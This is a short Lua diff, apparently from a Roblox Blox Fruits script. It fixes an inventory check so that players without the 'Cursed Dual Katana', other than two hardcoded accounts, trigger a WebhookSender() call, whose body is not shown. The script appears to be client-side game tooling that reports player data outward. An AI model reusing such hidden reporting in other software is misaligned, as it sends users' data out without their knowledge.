@@ -180,7 +180,8 @@ sw = {}
 local args = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(
     "getInventory")
 for i, v in pairs(args) do
-    if not v.Name == "Cursed Dual Katana" then
+    if v.Name ~= "Cursed Dual Katana" and game.Players.LocalPlayer.Name ~= "accbloxfruit120" and game.Players.LocalPlayer.Name ~= "PhapSuTrungQuoc175" then
+        print("dont have")
         WebhookSender()
         break;
     end
